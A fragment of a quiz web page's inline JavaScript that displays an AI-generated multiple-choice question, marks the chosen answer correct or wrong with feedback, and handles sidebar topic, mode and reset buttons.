  let answered = false;
  const dc = diffClass(q.difficulty || 'medium');
  const opts = q.options.map((o, i) => `
    <div class="option" data-ai-idx="${i}">
      <div class="opt-letter">${String.fromCharCode(65 + i)}</div>
      <div>${o}</div>
    </div>`).join('');

  zone.innerHTML = `
    <div class="q-card" style="border-color:rgba(255,107,53,0.3);margin-top:0;">
      <div class="q-meta">
        <span class="badge badge-topic">AI Generated</span>
        <span class="badge ${dc}">${q.difficulty || 'medium'}</span>
        <span class="badge badge-type">${q.type || 'Multiple Choice'}</span>
      </div>
      <div class="q-text">${q.question}</div>
      <div class="options" id="ai-opts">${opts}</div>
      <div class="feedback" id="ai-fb"></div>
      <div style="margin-top:11px;">
        <button class="btn-hint-style" id="btn-ai-next" style="font-size:.78rem;">Generate Another</button>
      </div>
    </div>`;

  document.querySelectorAll('[data-ai-idx]').forEach(el => {
    el.addEventListener('click', () => {
      if (answered) return;
      answered = true;
      const chosen  = parseInt(el.dataset.aiIdx);
      const correct = q.correct_index;
      document.querySelectorAll('[data-ai-idx]').forEach((opt, i) => {
        opt.classList.add('disabled');
        if (i === correct)                   opt.classList.add(chosen === correct ? 'correct' : 'reveal');
        else if (i === chosen && chosen !== correct) opt.classList.add('wrong');
      });
      const fb = document.getElementById('ai-fb');
      const ok = chosen === correct;
      fb.className = 'feedback show ' + (ok ? 'fb-correct' : 'fb-wrong');
      fb.innerHTML = ok
        ? `<div class="feedback-title">✓ Correct!</div>${q.correct_feedback || ''}`
        : `<div class="feedback-title">✗ Incorrect</div>${q.wrong_feedback || ''}`;
    });
  });

  document.getElementById('btn-ai-next').addEventListener('click', generateAI);
}

// =============================================================
//  SIDEBAR EVENT DELEGATION  (single listener, no onclick attrs)
// =============================================================
document.querySelector('.sidebar').addEventListener('click', e => {
  const topicBtn = e.target.closest('.topic-btn');
  const modeBtn  = e.target.closest('[data-mode]');
  const resetBtn = e.target.closest('#btn-reset');

  if (topicBtn) {
    const t = topicBtn.dataset.topic === 'all' ? 'all' : parseInt(topicBtn.dataset.topic);
    setTopic(t);
    startSession();
    return;
  }

  if (modeBtn) {
    setMode(modeBtn.dataset.mode);
    return;
  }

  if (resetBtn) {
    state.correct = 0; state.wrong = 0; state.total = 0;
    updateHeader();
    setTopic('all');
    showHome();
    return;
  }
});

// =============================================================
//  INIT
// =============================================================
showHome();


</script>
</body>
</html>
